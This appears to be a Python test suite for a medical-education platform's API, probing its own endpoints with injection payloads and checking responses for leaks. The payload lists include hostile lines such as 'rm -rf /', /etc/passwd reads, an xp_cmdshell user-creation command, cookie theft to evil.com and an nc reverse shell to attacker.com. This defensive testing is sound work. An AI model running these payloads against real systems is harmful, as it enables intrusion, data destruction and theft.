#!/usr/bin/env python3
"""
Injection Prevention Suite for Group 3C Complete Security Validation

Comprehensive injection prevention testing with enterprise-grade validation
for medical education platform security compliance.

Injection Types Tested:
- SQL Injection (Advanced patterns, blind, second-order)
- NoSQL Injection (MongoDB, Elasticsearch)
- XSS (Reflected, stored, DOM-based)
- Command Injection (OS command, template injection)
- LDAP Injection
- Medical Content Injection (UMLS, clinical data)
- RAGnostic Service Injection Security

Validation Targets:
- Complete input validation across all service boundaries
- Zero injection vulnerabilities detected
- Medical content integrity preservation
- Cross-service injection prevention
"""

import time
from datetime import datetime
from typing import Any
from unittest.mock import MagicMock, patch

from fastapi import status
from fastapi.testclient import TestClient


class InjectionPreventionSuite:
    """Comprehensive injection prevention testing framework."""

    def __init__(self):
        self.test_results = {}
        self.vulnerability_count = 0
        self.total_scenarios = 0
        self.medical_accuracy_violations = 0

    def execute_comprehensive_injection_testing(
        self, client: TestClient, auth_headers: dict[str, dict[str, str]]
    ) -> dict[str, Any]:
        """Execute comprehensive injection prevention testing."""

        test_report = {
            "timestamp": datetime.now().isoformat(),
            "test_suite": "Comprehensive Injection Prevention",
            "total_scenarios": 0,
            "vulnerabilities_found": 0,
            "prevention_rate": 0.0,
            "medical_accuracy_maintained": True,
            "test_categories": {},
        }

        # SQL Injection Testing
        sql_results = self._test_advanced_sql_injection_prevention(client, auth_headers)
        test_report["test_categories"]["Advanced_SQL_Injection"] = sql_results

        # NoSQL Injection Testing
        nosql_results = self._test_nosql_injection_prevention(client, auth_headers)
        test_report["test_categories"]["NoSQL_Injection"] = nosql_results

        # XSS Prevention Testing
        xss_results = self._test_comprehensive_xss_prevention(client, auth_headers)
        test_report["test_categories"]["Comprehensive_XSS"] = xss_results

        # Command Injection Testing
        cmd_results = self._test_command_injection_prevention(client, auth_headers)
        test_report["test_categories"]["Command_Injection"] = cmd_results

        # LDAP Injection Testing
        ldap_results = self._test_ldap_injection_prevention(client, auth_headers)
        test_report["test_categories"]["LDAP_Injection"] = ldap_results

        # Medical Content Injection Testing
        medical_results = self._test_medical_content_injection_prevention(
            client, auth_headers
        )
        test_report["test_categories"]["Medical_Content_Injection"] = medical_results

        # RAGnostic Service Injection Testing
        ragnostic_results = self._test_ragnostic_service_injection_prevention(
            client, auth_headers
        )
        test_report["test_categories"]["RAGnostic_Service_Injection"] = (
            ragnostic_results
        )

        # Calculate overall metrics
        total_scenarios = sum(
            result.get("scenarios", 0)
            for result in test_report["test_categories"].values()
        )
        total_vulnerabilities = sum(
            result.get("vulnerabilities", 0)
            for result in test_report["test_categories"].values()
        )

        test_report["total_scenarios"] = total_scenarios
        test_report["vulnerabilities_found"] = total_vulnerabilities
        test_report["prevention_rate"] = (
            ((total_scenarios - total_vulnerabilities) / total_scenarios * 100)
            if total_scenarios > 0
            else 0.0
        )
        test_report["medical_accuracy_maintained"] = (
            self.medical_accuracy_violations == 0
        )

        return test_report

    def _test_advanced_sql_injection_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test advanced SQL injection prevention patterns."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        # Advanced SQL injection payloads by category
        sql_injection_categories = {
            "Classic SQL Injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin'--",
                "' OR 'a'='a",
            ],
            "Union-Based Injection": [
                "' UNION SELECT password, email FROM users--",
                "' UNION SELECT version(), database(), user()--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
            ],
            "Time-Based Blind Injection": [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT COUNT(*) FROM pg_sleep(5)) > 0--",
            ],
            "Boolean-Based Blind Injection": [
                "' AND (SELECT COUNT(*) FROM users) > 0--",
                "' AND (SELECT LENGTH(password) FROM users WHERE id=1) > 5--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 65--",
                "' AND EXISTS(SELECT * FROM information_schema.tables)--",
            ],
            "Error-Based Injection": [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--",
            ],
            "Second-Order Injection": [
                "'; CREATE TABLE temp_table AS SELECT * FROM users--",
                "'; INSERT INTO audit_log VALUES ('injected', NOW())--",
                "'; UPDATE users SET role='admin' WHERE username=CURRENT_USER()--",
            ],
        }

        # Test endpoints vulnerable to SQL injection
        test_endpoints = [
            ("/api/v1/analytics/student/{}", "GET", "student_id"),
            ("/api/v1/assessment/competency/profile/{}", "GET", "profile_id"),
            ("/api/v1/study-guide/create", "POST", "topic"),
            ("/api/v1/nclex/generate", "POST", "topic"),
        ]

        for category, payloads in sql_injection_categories.items():
            for payload in payloads:
                for endpoint_template, method, field in test_endpoints:
                    results["scenarios"] += 1

                    try:
                        vulnerability_found = self._execute_sql_injection_test(
                            client,
                            auth_headers,
                            endpoint_template,
                            method,
                            field,
                            payload,
                        )

                        if vulnerability_found:
                            results["vulnerabilities"] += 1
                            results["test_details"].append(
                                {
                                    "category": category,
                                    "payload": payload[:50] + "..."
                                    if len(payload) > 50
                                    else payload,
                                    "endpoint": endpoint_template,
                                    "method": method,
                                    "field": field,
                                    "vulnerability": "SQL injection possible",
                                }
                            )

                    except Exception as e:
                        results["test_details"].append(
                            {
                                "category": category,
                                "payload": payload[:30] + "...",
                                "error": str(e),
                            }
                        )

        return results

    def _test_nosql_injection_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test NoSQL injection prevention (MongoDB, Elasticsearch)."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        # NoSQL injection payloads by database type
        nosql_payloads = {
            "MongoDB Injection": [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$regex": ".*"}',
                '{"$where": "this.username == \'admin\'"}',
                '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
                '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
            ],
            "Elasticsearch Injection": [
                '{"query": {"match_all": {}}}',
                '{"query": {"wildcard": {"field": "*"}}}',
                '{"script": {"source": "Math.exp(700)"}}',
                '{"query": {"bool": {"script": {"script": "1==1"}}}}',
            ],
        }

        test_endpoints = [
            "/api/v1/study-guide/create",
            "/api/v1/nclex/generate",
            "/api/v1/clinical-support/scenarios/generate",
        ]

        for injection_type, payloads in nosql_payloads.items():
            for payload in payloads:
                for endpoint in test_endpoints:
                    results["scenarios"] += 1

                    try:
                        vulnerability_found = self._execute_nosql_injection_test(
                            client, auth_headers, endpoint, payload
                        )

                        if vulnerability_found:
                            results["vulnerabilities"] += 1
                            results["test_details"].append(
                                {
                                    "type": injection_type,
                                    "payload": payload,
                                    "endpoint": endpoint,
                                    "vulnerability": "NoSQL injection possible",
                                }
                            )

                    except Exception as e:
                        results["test_details"].append(
                            {"type": injection_type, "error": str(e)}
                        )

        return results

    def _test_comprehensive_xss_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test comprehensive XSS prevention across all contexts."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        # XSS payloads by context and technique
        xss_categories = {
            "HTML Context XSS": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')></svg>",
                "<body onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'></iframe>",
            ],
            "JavaScript Context XSS": [
                "';alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "'-alert('XSS')-'",
                "\";alert('XSS');//",
            ],
            "CSS Context XSS": [
                "</style><script>alert('XSS')</script>",
                "expression(alert('XSS'))",
                "background:url('javascript:alert(1)')",
                "@import 'javascript:alert(1)'",
            ],
            "URL Context XSS": [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')",
                "livescript:alert('XSS')",
            ],
            "Encoded XSS": [
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
                "\x3cscript\x3ealert('XSS')\x3c/script\x3e",
            ],
            "Filter Bypass XSS": [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script/random>alert('XSS')</script>",
                "<script\x20type=\"text/javascript\">alert('XSS')</script>",
                "<script\x3ealert('XSS')</script>",
            ],
        }

        test_contexts = [
            ("/api/v1/study-guide/create", "topic", "Study guide content"),
            ("/api/v1/nclex/generate", "topic", "NCLEX question content"),
            (
                "/api/v1/clinical-support/scenarios/generate",
                "clinical_scenario",
                "Clinical scenario content",
            ),
        ]

        for category, payloads in xss_categories.items():
            for payload in payloads:
                for endpoint, field, context in test_contexts:
                    results["scenarios"] += 1

                    try:
                        vulnerability_found = self._execute_xss_test(
                            client, auth_headers, endpoint, field, payload
                        )

                        if vulnerability_found:
                            results["vulnerabilities"] += 1
                            results["test_details"].append(
                                {
                                    "category": category,
                                    "payload": payload,
                                    "endpoint": endpoint,
                                    "context": context,
                                    "vulnerability": "XSS vulnerability detected",
                                }
                            )

                    except Exception as e:
                        results["test_details"].append(
                            {"category": category, "error": str(e)}
                        )

        return results

    def _test_command_injection_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test OS command and template injection prevention."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        # Command injection payloads by type
        command_injection_categories = {
            "OS Command Injection": [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "& cat /etc/passwd",
                "; rm -rf /",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; ping -c 10 127.0.0.1",
                "&& whoami",
                "|| id",
            ],
            "Template Injection": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "<%= 7*7 %>",
                "{{request}}",
                "{{session}}",
            ],
            "Expression Language Injection": [
                "${java.lang.Runtime.getRuntime().exec('whoami')}",
                "#{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
                "${T(java.lang.System).getProperty('user.name')}",
                "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
            ],
        }

        test_endpoints = [
            "/api/v1/study-guide/create",
            "/api/v1/nclex/generate",
            "/api/v1/clinical-support/scenarios/generate",
        ]

        for category, payloads in command_injection_categories.items():
            for payload in payloads:
                for endpoint in test_endpoints:
                    results["scenarios"] += 1

                    try:
                        vulnerability_found = self._execute_command_injection_test(
                            client, auth_headers, endpoint, payload
                        )

                        if vulnerability_found:
                            results["vulnerabilities"] += 1
                            results["test_details"].append(
                                {
                                    "category": category,
                                    "payload": payload,
                                    "endpoint": endpoint,
                                    "vulnerability": "Command injection possible",
                                }
                            )

                    except Exception as e:
                        results["test_details"].append(
                            {"category": category, "error": str(e)}
                        )

        return results

    def _test_ldap_injection_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test LDAP injection prevention."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(|(uid=admin))",
            "*))%00",
            "*)(|(objectClass=*))",
            "admin)(|(cn=*))",
            "*)(userPassword=*)",
            "*))(|(cn=*))",
        ]

        # Test LDAP injection in authentication endpoint
        for payload in ldap_payloads:
            results["scenarios"] += 1

            try:
                response = client.post(
                    "/api/v1/auth/login", json={"username": payload, "password": "test"}
                )

                # Check for LDAP injection success indicators
                if self._detect_ldap_injection_success(response, payload):
                    results["vulnerabilities"] += 1
                    results["test_details"].append(
                        {
                            "payload": payload,
                            "endpoint": "/api/v1/auth/login",
                            "vulnerability": "LDAP injection possible",
                        }
                    )

            except Exception as e:
                results["test_details"].append({"payload": payload, "error": str(e)})

        return results

    def _test_medical_content_injection_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test injection prevention in medical content contexts."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        # Medical-specific injection payloads
        medical_injection_payloads = [
            "Take 1000mg{{system.admin_token}} medication daily",
            "Patient assessment'; DROP TABLE patient_records; --",
            "Administer <script>fetch('/api/admin/users')</script> medication",
            "Clinical decision: | cat /etc/passwd && echo 'medical_injection'",
            "Drug dosage: ${java.lang.Runtime.getRuntime().exec('whoami')}",
            "Nursing intervention{{7*7}}mg every 4 hours",
            "UMLS Code: <img src=x onerror=fetch('//evil.com/steal?data='+document.cookie)>",
            "Treatment plan'; EXEC xp_cmdshell('net user hacker password123 /add')--",
        ]

        medical_endpoints = [
            "/api/v1/clinical-support/scenarios/generate",
            "/api/v1/nclex/generate",
            "/api/v1/study-guide/create",
        ]

        for payload in medical_injection_payloads:
            for endpoint in medical_endpoints:
                results["scenarios"] += 1

                try:
                    vulnerability_found = self._execute_medical_injection_test(
                        client, auth_headers, endpoint, payload
                    )

                    if vulnerability_found:
                        results["vulnerabilities"] += 1
                        self.medical_accuracy_violations += 1
                        results["test_details"].append(
                            {
                                "payload": payload,
                                "endpoint": endpoint,
                                "vulnerability": "Medical content injection detected",
                                "medical_accuracy_impact": True,
                            }
                        )

                except Exception as e:
                    results["test_details"].append(
                        {"payload": payload[:30] + "...", "error": str(e)}
                    )

        return results

    def _test_ragnostic_service_injection_prevention(
        self, client: TestClient, auth_headers: dict
    ) -> dict[str, Any]:
        """Test injection prevention in RAGnostic service interactions."""
        results = {"scenarios": 0, "vulnerabilities": 0, "test_details": []}

        with patch("src.services.ragnostic_client.RAGnosticClient") as mock_client:
            mock_instance = MagicMock()
            mock_instance.search_content.return_value = {"items": [], "total": 0}
            mock_client.return_value = mock_instance

            # RAGnostic-specific injection payloads
            ragnostic_payloads = [
                '{"$where": "this.secret == true"}',  # NoSQL injection
                'search"; system("whoami"); echo "',  # Command injection
                '<script>fetch("https://evil.com?data="+document.cookie)</script>',  # XSS
                '{"query": {"bool": {"script": {"source": "java.lang.Runtime.getRuntime().exec(\\"id\\")"}}}}}',  # Elasticsearch
                "'; DROP TABLE content; SELECT 'injected' as result--",  # SQL injection
                "{{config.SECRET_KEY}}",  # Template injection
                "search_term | nc -e /bin/sh attacker.com 4444",  # Command injection
                '{"__proto__": {"isAdmin": true}}',  # Prototype pollution
            ]

            for payload in ragnostic_payloads:
                results["scenarios"] += 1

                try:
                    client.post(
                        "/api/v1/study-guide/create",
                        json={
                            "topic": f"RAGnostic Search: {payload}",
                            "competencies": ["AACN_KNOWLEDGE_1"],
                        },
                        headers=auth_headers.get("student1", {}),
                    )

                    # Check if payload was properly sanitized before sending to RAGnostic
                    if mock_instance.search_content.called:
                        call_args = mock_instance.search_content.call_args
                        if self._detect_unsanitized_ragnostic_payload(
                            call_args, payload
                        ):
                            results["vulnerabilities"] += 1
                            results["test_details"].append(
                                {
                                    "payload": payload,
                                    "vulnerability": "Unsanitized payload sent to RAGnostic",
                                    "service": "RAGnostic",
                                }
                            )

                except Exception as e:
                    results["test_details"].append(
                        {"payload": payload[:30] + "...", "error": str(e)}
                    )

        return results

    # Helper methods for injection testing

    def _execute_sql_injection_test(
        self,
        client: TestClient,
        auth_headers: dict,
        endpoint_template: str,
        method: str,
        field: str,
        payload: str,
    ) -> bool:
        """Execute SQL injection test and detect success."""
        start_time = time.time()

        try:
            if method == "GET":
                response = client.get(
                    endpoint_template.format(payload),
                    headers=auth_headers.get("instructor1", {}),
                )
            else:
                data = {field: payload, "competencies": ["AACN_KNOWLEDGE_1"]}
                if "nclex" in endpoint_template:
                    data.update({"difficulty": "medium", "question_count": 1})
                if "scenarios" in endpoint_template:
                    data.update(
                        {"clinical_scenario": payload, "complexity_level": "basic"}
                    )

                response = client.post(
                    endpoint_template,
                    json=data,
                    headers=auth_headers.get("student1", {}),
                )

            end_time = time.time()
            response_time = end_time - start_time

            return self._detect_sql_injection_success(response, payload, response_time)

        except Exception:
            return False

    def _execute_nosql_injection_test(
        self, client: TestClient, auth_headers: dict, endpoint: str, payload: str
    ) -> bool:
        """Execute NoSQL injection test and detect success."""
        try:
            data = {
                "topic": f"NoSQL Test: {payload}",
                "competencies": ["AACN_KNOWLEDGE_1"],
            }

            if "nclex" in endpoint:
                data.update({"difficulty": "medium", "question_count": 1})
            if "scenarios" in endpoint:
                data.update({"clinical_scenario": payload, "complexity_level": "basic"})

            response = client.post(
                endpoint, json=data, headers=auth_headers.get("student1", {})
            )

            return self._detect_nosql_injection_success(response, payload)

        except Exception:
            return False

    def _execute_xss_test(
        self,
        client: TestClient,
        auth_headers: dict,
        endpoint: str,
        field: str,
        payload: str,
    ) -> bool:
        """Execute XSS test and detect success."""
        try:
            data = {
                field: f"Medical Content {payload}",
                "competencies": ["AACN_KNOWLEDGE_1"],
            }

            if "nclex" in endpoint:
                data.update({"difficulty": "medium", "question_count": 1})
            if "scenarios" in endpoint:
                data.update({"complexity_level": "basic"})

            response = client.post(
                endpoint, json=data, headers=auth_headers.get("student1", {})
            )

            return self._detect_xss_success(response, payload)

        except Exception:
            return False

    def _execute_command_injection_test(
        self, client: TestClient, auth_headers: dict, endpoint: str, payload: str
    ) -> bool:
        """Execute command injection test and detect success."""
        try:
            data = {
                "topic": f"Medical Content {payload}",
                "competencies": ["AACN_KNOWLEDGE_1"],
            }

            if "nclex" in endpoint:
                data.update({"difficulty": "medium", "question_count": 1})
            if "scenarios" in endpoint:
                data.update(
                    {
                        "clinical_scenario": f"Clinical scenario {payload}",
                        "complexity_level": "basic",
                    }
                )

            response = client.post(
                endpoint, json=data, headers=auth_headers.get("student1", {})
            )

            return self._detect_command_injection_success(response, payload)

        except Exception:
            return False

    def _execute_medical_injection_test(
        self, client: TestClient, auth_headers: dict, endpoint: str, payload: str
    ) -> bool:
        """Execute medical content injection test and detect success."""
        try:
            data = self._create_medical_test_data(endpoint, payload)

            response = client.post(
                endpoint, json=data, headers=auth_headers.get("student1", {})
            )

            return self._detect_medical_injection_success(response, payload)

        except Exception:
            return False

    # Detection methods for various injection types

    def _detect_sql_injection_success(
        self, response, payload: str, response_time: float = 0
    ) -> bool:
        """Detect SQL injection success indicators."""
        # Server error indicates possible SQL injection
        if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
            return True

        response_text = response.text.lower()

        # SQL error messages
        sql_error_indicators = [
            "mysql",
            "postgresql",
            "sqlite",
            "syntax error",
            "sql error",
            "table",
            "column",
            "database",
            "constraint",
            "foreign key",
            "duplicate entry",
            "data truncated",
            "unknown column",
        ]

        if any(indicator in response_text for indicator in sql_error_indicators):
            return True

        # Time-based SQL injection detection
        if "sleep" in payload.lower() or "waitfor" in payload.lower():
            if response_time > 4.0:  # Payload should cause delay
                return True

        # Union-based injection success
        if "union" in payload.lower() and response.status_code == 200:
            # Look for additional data or structure changes
            if len(response.text) > 10000:  # Unusual response size
                return True

        return False

    def _detect_nosql_injection_success(self, response, payload: str) -> bool:
        """Detect NoSQL injection success indicators."""
        if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
            return True

        response_text = response.text.lower()

        nosql_error_indicators = [
            "mongodb",
            "bson",
            "objectid",
            "cursor",
            "aggregation",
            "elasticsearch",
            "lucene",
            "query_parsing_exception",
            "script_exception",
            "search_parse_exception",
        ]

        return any(indicator in response_text for indicator in nosql_error_indicators)

    def _detect_xss_success(self, response, payload: str) -> bool:
        """Detect XSS success indicators."""
        if response.status_code != 200:
            return False

        response_text = response.text

        # Check if XSS payload appears unescaped in response
        xss_indicators = [
            "<script>",
            "</script>",
            "onerror=",
            "onload=",
            "onclick=",
            "javascript:",
            "alert(",
            "<iframe",
            "<svg",
            "<img",
        ]

        return any(
            indicator.lower() in response_text.lower() for indicator in xss_indicators
        )

    def _detect_command_injection_success(self, response, payload: str) -> bool:
        """Detect command injection success indicators."""
        if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
            return True

        if response.status_code != 200:
            return False

        response_text = response.text

        # Command execution output indicators
        command_output_indicators = [
            "root:x:",
            "/bin/bash",
            "uid=",
            "gid=",
            "groups=",
            "/etc/passwd",
            "/etc/shadow",
            "LISTEN",
            "tcp",
            "udp",
            "drwx",
            "-rw-",
            "total ",
            "49",  # 7*7 result for template injection
            "config",
            "session",
            "request",
            "__class__",
        ]

        return any(
            indicator in response_text for indicator in command_output_indicators
        )

    def _detect_ldap_injection_success(self, response, payload: str) -> bool:
        """Detect LDAP injection success indicators."""
        if response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR:
            return True

        # LDAP injection typically results in authentication bypass
        if response.status_code == status.HTTP_200_OK:
            # Successful login with malicious payload indicates LDAP injection
            return True

        response_text = response.text.lower()
        ldap_error_indicators = [
            "ldap",
            "distinguished name",
            "objectclass",
            "directory",
            "bind error",
        ]

        return any(indicator in response_text for indicator in ldap_error_indicators)

    def _detect_medical_injection_success(self, response, payload: str) -> bool:
        """Detect medical content injection success indicators."""
        if response.status_code != 200:
            return False

        response_text = response.text.lower()

        # Medical content should not contain dangerous elements
        dangerous_medical_elements = [
            "drop table",
            "<script>",
            "cat /etc/passwd",
            "whoami",
            "admin_token",
            "system.",
            "runtime.exec",
            "alert(",
            "fetch(",
            "document.cookie",
            "xp_cmdshell",
        ]

        return any(element in response_text for element in dangerous_medical_elements)

    def _detect_unsanitized_ragnostic_payload(self, call_args, payload: str) -> bool:
        """Detect if payload was sent unsanitized to RAGnostic."""
        if not call_args:
            return False

        call_data = str(call_args[0]) if call_args[0] else ""
        if len(call_args) > 1:
            call_data += str(call_args[1])

        # Check if dangerous patterns exist in the call to RAGnostic
        dangerous_patterns = [
            "DROP TABLE",
            "<script>",
            "rm -rf",
            "system(",
            "{{7*7}}",
            "$where",
            "__proto__",
            "Runtime.getRuntime",
        ]

        return any(pattern in call_data.upper() for pattern in dangerous_patterns)

    def _create_medical_test_data(self, endpoint: str, content: str) -> dict[str, Any]:
        """Create appropriate test data for medical endpoints."""
        base_data = {"competencies": ["AACN_KNOWLEDGE_1"]}

        if "nclex" in endpoint:
            base_data.update(
                {"topic": content, "difficulty": "medium", "question_count": 1}
            )
        elif "scenarios" in endpoint:
            base_data.update(
                {"clinical_scenario": content, "complexity_level": "basic"}
            )
        else:
            base_data.update({"topic": content})

        return base_data


# Integration functions for Group 3C validation


def execute_comprehensive_injection_prevention_testing(
    client: TestClient, auth_headers: dict[str, dict[str, str]]
) -> dict[str, Any]:
    """Execute comprehensive injection prevention testing for Group 3C."""
    suite = InjectionPreventionSuite()
    return suite.execute_comprehensive_injection_testing(client, auth_headers)


if __name__ == "__main__":
    print("Injection Prevention Suite for Group 3C Complete Security Validation")
    print("Comprehensive injection prevention testing with enterprise-grade validation")
    print()
    print("Injection Types Tested:")
    print("- SQL Injection (Advanced patterns, blind, second-order)")
    print("- NoSQL Injection (MongoDB, Elasticsearch)")
    print("- XSS (Reflected, stored, DOM-based)")
    print("- Command Injection (OS command, template injection)")
    print("- LDAP Injection")
    print("- Medical Content Injection")
    print("- RAGnostic Service Injection Security")
    print()
    print("Usage:")
    print(
        "  from injection_prevention_suite import execute_comprehensive_injection_prevention_testing"
    )
    print(
        "  report = execute_comprehensive_injection_prevention_testing(client, auth_headers)"
    )
